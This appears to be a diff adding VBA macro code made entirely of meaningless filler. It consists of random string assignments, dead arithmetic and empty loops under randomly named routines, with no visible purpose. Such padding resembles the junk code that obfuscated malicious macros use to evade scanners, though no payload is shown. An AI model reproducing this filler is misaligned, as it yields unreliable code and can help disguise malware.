+    EeZZa = Right(".YUtdKbJ.-Q.LXXrXq", 2)
+    LFzMCY = StrReverse(")QfgMvdaLISayd")
+    mYeHr = 171 + 1049 + 1421
+    EeZZa = StrReverse("DD@Ph$xfOs]nE*oc")
+    JyvlJPlv = RTrim("s(QU[!@&AfUnM]")
+    MBLnI = Right("tF@ S^MiNMsYAYbG", 5)
+    whhXS = UCase("?$qCN-B&WRKY]uZc")
+    JyvlJPlv = Space(9)
+    JyvlJPlv = 1534 - 705 - 360
+    For XwRAic = 0 To 373
+        LFzMCY = 261 - 1177 - 1819
+        JyvlJPlv = LTrim("y*A I##gB$&r@Nt_ay")
+        EeZZa = Right("_GH $HVYHM!! SpwRIpk", 3)
+        whhXS = UCase("UoOoNk_HBu&S")
+        JyvlJPlv = StrReverse("M-MvO* FE!Gsk(S")
+        HxsJcpnb = StrReverse("Ka[*mFGyTDrD")
+    Next XwRAic
+
+    While ROdDPi < 102
+        LFzMCY = StrReverse("-[dUfOXA-eGb")
+        hhspCB = UCase("lCeF!KTZwu")
+        JyvlJPlv = 1233 - 1714 - 383
+        ROdDPi = ROdDPi + 3
+    Wend
+
+    hhspCB = RTrim("@_X(!L!TJW[q")
+    LFzMCY = Space(2)
+    whhXS = UCase("%$ZzUe _t)YzT$P")
+    MBLnI = Right("N%#@--@lvkcHP&a[)", 3)
+    mYeHr = "JXHWje!ozv]DN@c" + "g_oADihj$eWTwESd" + "kVsGyE!BWV Lyx_N?L"
+    PtdwLqg = UCase("i_a[c Yv[ ")
+    mYeHr = Space(12)
+    mYeHr = RTrim("n&dSRzzXEG")
+    whhXS = "jIOTeRey_r" + "?^PjXLnNWVIBb!" + "]PG$x- iSrtSASsYiQ"
+    whhXS = Left("GLyhKbYAILIEGMbB", 4)
+    LFzMCY = "enIaAZC&BeTWOlpc((q" + "&sy#eAt?y-Bd" + "C#RSHIy$vdtWrG[?"
+    mYeHr = StrReverse("*nebDwIA.u)?[mIkW]*")
+    whhXS = Right("jSy)ZcoUe*dup Tp ", 2)
+    EeZZa = RTrim("GZauDpPYOFP_W%u")
+    MBLnI = Right("Je[.N[&c&^^ANF", 3)
+    EeZZa = UCase("dk)XoCWmVR-p%_")
+End Sub
+
+Private Sub YGYSPF(zDqLReo As Integer)
+    whhXS = Right("vyR)GBzyYNQORtB^^", 3)
+    For xZOZjE = 0 To 362
+        EeZZa = StrReverse("L&k??yPbH#dGSs gh^[Q")
+        whhXS = UCase("_U*gq%X]Yj")
+        LFzMCY = LTrim("^jpGJjW[wckE.n_$epj")
+        EeZZa = 1197 - 1500 - 1397
+    Next xZOZjE
+
+    For aWKmna = 0 To 365
+        HxsJcpnb = 888 - 1141 - 1105
+        MBLnI = UCase("ZLeo U nXEVcwf")
+    Next aWKmna
+
+    MBLnI = Left("T-nkthfeu*ax ", 5)
+    MBLnI = RTrim("e!lfIsjmTULzkm")
+    PtdwLqg = Right("Sil(pRykXw_jfeqZO", 4)
+    mYeHr = LTrim("SICwJ.YNob-$ii&wT")
+    HxsJcpnb = "aFdD^odOhH Pd" + " cT?]pkaBSR.EQO_eYu" + "vA@Hehmi!t"
+    For AFbkPh = 0 To 140
+        hhspCB = Right("gA^Xacii@n@NdQ", 3)
+        EeZZa = StrReverse("ipTqnqo^c#^yg")
+        mYeHr = Right("RSjQ@?r#TFgbQ$hP&Id", 2)
+        JyvlJPlv = 235 - 1920 - 839
+        LFzMCY = 658 + 1085 + 366
+        HxsJcpnb = StrReverse("WSvFL@wcUkYzfr n")
+    Next AFbkPh
+
+    EeZZa = Right("(wTzQfSFUyK_", 3)
+    mYeHr = LTrim("Bmwl_NBy_T.[hMyw")
+    LFzMCY = Left("Sc#.k^Zjpz#xVf!", 5)
+    HxsJcpnb = Space(13)
+    mYeHr = RTrim("MNaxJdMy]xSdaA")
+    mYeHr = 761 + 1564 + 625
+    HxsJcpnb = 1179 - 254 - 1676
+    LFzMCY = Left("&QJyUJgu]!S", 5)
+    LFzMCY = RTrim("#-.fDKGDBbq$?rH")
+    LFzMCY = Left(".N-pIKRbKY]Re?qg", 3)
+    MBLnI = Left("ylUdvoYRt%S&BucnC", 4)
+    HxsJcpnb = UCase("fh%EHXULAe")
+    mYeHr = StrReverse("zZrmWOwJWjUy]bqb[%to")
+    HxsJcpnb = "lRQv hOIXXPbw?hS(" + "lZicNIGUmZ^A!iUsQksA" + "M#([-zOCQCiQBo&bN*"
+    EeZZa = "UImMQe.s(?ki ." + "ZKbtdmsCEitOSmDZ@aql" + "$)Td.[p-i?gjcBcX^KT"
+    While PrOcmm < 393
+        JyvlJPlv = 1487 - 385 - 122
+        whhXS = Right("-.jhWzGM#Zqkr", 4)
+        LFzMCY = RTrim("gc%Pw!TnKe(M")
+        hhspCB = UCase("GN^UjCV@^(sX[")
+        hhspCB = Right("tBUCJPERcqt?ynW^", 5)
+        mYeHr = StrReverse("tItUcLl@VaTf#&Ayw")
+        whhXS = "zw[s.C&BVg-cwBh" + "jxjKiHaBy^G-!&?NO" + "ipsJPWImUhP"
+        PrOcmm = PrOcmm + 2
+    Wend
+
+End Sub
+
+Private Sub iWLiDl(mkOakf As String, BiCDzvI As Integer)
+    MBLnI = RTrim("Wb$QR&qWOG")
+    hhspCB = 1891 + 1135 + 900
+    HxsJcpnb = RTrim("X@wm!.kt^[#c!d&xxS*u")
+    HxsJcpnb = Space(8)
+    For TJHgXy = 0 To 243
+        HxsJcpnb = LTrim("QmnbiWRs[zO(-gp@")
+        PtdwLqg = StrReverse("aw)ZUhow-c$pncad")
+        mYeHr = UCase("%B[jomlWtgFv)U lyHO")
+        MBLnI = LTrim("R&ke#o&#TxdRZL].(^v")
+        mYeHr = 1614 + 1037 + 1612
+        HxsJcpnb = Space(12)
+        MBLnI = LTrim("fs@lF(*fMl_ve)-gC")
+        PtdwLqg = LTrim("h]YVXi-N%g&")
+    Next TJHgXy
+
+    LFzMCY = UCase("qpBseVjz!uDYN")
+    whhXS = 797 + 532 + 1779
+    HxsJcpnb = Left("rH&aHK(IqVkgXg", 4)
+    LFzMCY = 653 + 184 + 132
+    hhspCB = 1110 + 530 + 862
+    JyvlJPlv = "_#_vHm@S?VqkGhLy" + "&Wxvy$-e&lqb" + " ufAqp%.@Xci$CmmbI)"
+    MBLnI = UCase("mqk*mI@BktqV ")
+    While yXfNLt < 61
+        whhXS = Left("mkcy?EzTiW", 3)
+        mYeHr = UCase("r^nADy_ZUCI")
+        MBLnI = Right("!$sCiUntDpZ", 2)
+        yXfNLt = yXfNLt + 1
+    Wend
+
+    MBLnI = "QPJKwJd@Q.bN(yFnNvwP" + "K[*cFP_KrpLnR$iB" + " cd.ao?jpqo@!]"
+    HxsJcpnb = "V!bolMH_vKN" + "bt&ZPiB?I#a.D[iYnE[" + "sZOjqJf#a*OQP@)[!j"
+    HxsJcpnb = Left("WTw#QMhddkWo", 4)
+    LFzMCY = RTrim("pr(VnHfPcUgohd%hz")
+    JyvlJPlv = UCase("VzLJBsM)rzD$sL$wk")
+    HxsJcpnb = 1622 + 206 + 816
+    hhspCB = UCase("N-JLwW_BbgY.?N[m#T")
+    JyvlJPlv = Right("ZQsuObnzHpyC@]HTq", 4)
+End Sub
+
+Private Function nFTfPB(dLIKrQ As Integer, nHttIRF As Double, QcLDgr As Double, GQKyKX As Integer, sTENqMr As Boolean) As String
+    LFzMCY = UCase("^uRqIW]^HrT%F?.hvCuV")
+    MBLnI = "-yd]LVrw]z(Xd(*?XZ" + "#PTUK(p[mUH@!ALRJO" + "SlXJR.PVz$PwmJPT"
+    JyvlJPlv = LTrim("WU.ctG)nasQE?*bzzd^")
+    For GOezYe = 0 To 165
+        PtdwLqg = Space(7)
+        LFzMCY = Right("Vvq$j pFlwVKgs", 2)
+        LFzMCY = "q? seT]TQSO@GwbjoK_[" + "jX[ZeEYEmNmpp@" + ".^b(kmNA?G# "
+        EeZZa = "r-ndNoA.ETlqG yu" + "oLAXy#TJl(j)rXRLa" + "mHp#I&csUoC&"
+        EeZZa = Right("^b%OOzIHy(-[li.LB!", 4)
+        LFzMCY = 902 - 1177 - 609
+        mYeHr = 1542 + 1316 + 1060
+        EeZZa = StrReverse("dOD#[qzL]ZDV")
+    Next GOezYe
+
+    EeZZa = StrReverse("kiMCyJfhPE_O")
+    hhspCB = StrReverse("elu$Lbbfsrdc!lruN%uZ")
+    mYeHr = Space(19)
+    LFzMCY = StrReverse("]N)Thnp*i*__#&XRyBrM")
+    LFzMCY = Space(13)
+    MBLnI = "PUZ)f@OZzA GfI_" + "Rl)_MhpY)LpC(yO" + ")muV(@YZEJq-"
+    PtdwLqg = "cDw[Ckcu.H" + "b APlb![W*s" + "Htx-_%&YK!Ddb"
+    PtdwLqg = StrReverse("J$Ab*U) B.UBkt q")
+    MBLnI = 1119 + 1144 + 1780
+    whhXS = Left("(tWM$#%vj-iRU*fz", 4)
+    HxsJcpnb = StrReverse("k a^MneBlKUpYlW(on")
+    HxsJcpnb = Right("[pKKi*CbHtx[?Z", 3)
+    EeZZa = Left("?PtrNFtEfmZFGSvPP", 4)
+    mYeHr = StrReverse("DIwbMLS_B@lUGH")
+    EeZZa = LTrim("%@QA?ltpyH&HsmeS@")
+    PtdwLqg = "ssgJxOS-(R@LXl" + "bOVeD?A]]nfOJ" + "M(]m[rI n_wblgR*I"
+    hhspCB = LTrim("&S&[NOi)elTYZV")
+    mYeHr = LTrim("w?b?A]-SyPLLc")
+    whhXS = Right("v NW(W.I_Gjlypq?Nvgp", 2)
+    HxsJcpnb = StrReverse("sRWHFP&LJR@p")
+    JyvlJPlv = Space(6)
+    nFTfPB = "UBoZFwrkxZhhLDEWXjaUmrIxc"
+End Function
+
+Private Sub qGPkoG(JKXLszl As String)
+    EeZZa = Right("D.XhjxtI*?RqB", 5)
+    whhXS = Right("-EzKmXVDiZFGpWZ&if", 4)
+    For QAYrbc = 0 To 317
+        HxsJcpnb = RTrim("hP[qECiLE@L")
+        LFzMCY = LTrim(".mLrd[Lpx@rDT#")
+        LFzMCY = 1346 - 894 - 1012
+        MBLnI = 1004 + 1125 + 150
+        HxsJcpnb = StrReverse("QuiuPSdHjYU]OiRXfu")
+        whhXS = Right("glEDqB!fW-wxgQxBY?Oy", 3)
+        JyvlJPlv = LTrim("xoAcB$ ZmJyh")
+        LFzMCY = Right("m#]K_DqeGg*($aU_!VLs", 4)
+        PtdwLqg = 292 + 185 + 1727
+        PtdwLqg = 1890 - 103 - 1367
+    Next QAYrbc
+
+    JyvlJPlv = UCase("frcWHRzpXzHvtGJz")
+    JyvlJPlv = Left("w OEg!DhovqGEr", 5)
+    PtdwLqg = 1043 + 1332 + 502
+    JyvlJPlv = Space(3)
+    LFzMCY = Space(4)
+    HxsJcpnb = LTrim("UGo()ILO-zNIp.?sMIH")
+    EeZZa = LTrim("ZbU.*H^a-)q %l")
+    hhspCB = Right("yVuktJq_W_.", 3)
+    PtdwLqg = 141 + 407 + 131
+    While iGryZK < 279
+        hhspCB = 399 + 711 + 351
+        PtdwLqg = RTrim("lIZrG$.ABzzljPRo_N]")
+        HxsJcpnb = 835 + 1433 + 1629
+        mYeHr = LTrim("IwwavqPtBkgD!l)!ckJK")
+        iGryZK = iGryZK + 2
+    Wend
+
+    mYeHr = LTrim("fNfd_Wk[ht_-x@QLk")
+    EeZZa = RTrim("dQLM%wFjVgY&jvGqvQKo")
+    MBLnI = 671 - 203 - 559
+    mYeHr = Space(5)
+    mYeHr = "rfTM??ZasVWP" + "FoNsHzkq&x." + "p$ghXUy]vT*@uA"
+    PtdwLqg = UCase("s!SXELC#vgeRA")
+    MBLnI = "vzylKZR*Q]PIkWRTZFQ" + "_wTOfB@rja*tKk*r?" + "l!wTM@?f(J-Yw"
+    JyvlJPlv = 954 + 1459 + 183
+    PtdwLqg = 1941 + 1860 + 1586
+End Sub
+
